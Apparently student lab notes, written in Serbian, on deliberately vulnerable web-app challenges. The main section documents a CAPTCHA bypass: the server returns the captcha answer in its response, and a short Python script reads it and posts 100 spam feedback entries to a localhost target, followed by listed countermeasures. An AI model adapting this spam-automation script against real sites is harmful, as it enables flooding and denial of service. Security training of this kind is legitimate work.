## 1) Saznati adminovu lozinku (pošto se nije potrudio da bude teška za otkriti:)

**Назив изазова у апликацији**: **Password Strength**

## 2) Zaobići CAPTCHA zaštitu protiv automatizovanog davanja review-a

**Назив изазова у апликацији**: **CAPTCHA Bypass**

**Класа напада**: DoS, лоша анти-аутомација

**Утицај**: Нападач брзо може послати велик број захтева и изазвати denial of service.
Нападач може поплавити базу података за фидбеком и попунити читав простор на диску.
Апликација има увећан лажни саобраћај (нарушена аналитика).

**Рањивости**: Решење капче се шаље у HTTP одговору. Капча се шаље у формату погодном
за рачунар да га брзо реши (у случају да се не шаље тачан одговор).

**Контрамере**:

1. Решење капче се не сме слати као одговор на захтев. Оно се чува у бази и пореди на бекенду.
2. Тај математички израз треба послати као слику где су симболи и позадина модификовани (шум, дисторција итд.) да их OCR не може препознати.

**Белешке**:

Текст могу добавити преко `document.getElementById("captcha")`.
У JS-у могу евалуирати користећи `eval(document.getElementById("captcha").textContent);`.

Кепча се добавља у `GET /rest/captcha/` захтеву.
Резултат захтева је:

```json
{
  "captchaId": 5,
  "captcha": "4*7+5",
  "answer": "33"
}
```

Тако да не морам ни да се трудим око евалуације, бекенд сам врати резултат.

Форма са кепчом се шаље на `POST /api/Feedbacks/` уз следеће податке:

```json
{
  "UserId": 22,
  "captchaId": 6,
  "captcha": "123",
  "comment": "123 (***.a)",
  "rating": 2
}
```

Тако да могу написати пајтон скрипту која ће спамовати фидбек:

```python
import requests
import json

def submit_fake_response():
    res = requests.get("http://localhost:3000/rest/captcha")

    captcha_payload = json.loads(res.content.decode("utf-8"))
    captcha_answer = captcha_payload['answer']
    captcha_id = captcha_payload['captchaId']
    payload = {
        "UserId":22,
        "captchaId":captcha_id,
        "captcha":str(captcha_answer),
        "comment":"spam (***.a)",
        "rating":2
    }

    requests.post("http://localhost:3000/api/Feedbacks", json=payload)


for i in range(100):
    submit_fake_response()
```

## 3) Otkriti i skinuti easter egg

Easter Egg
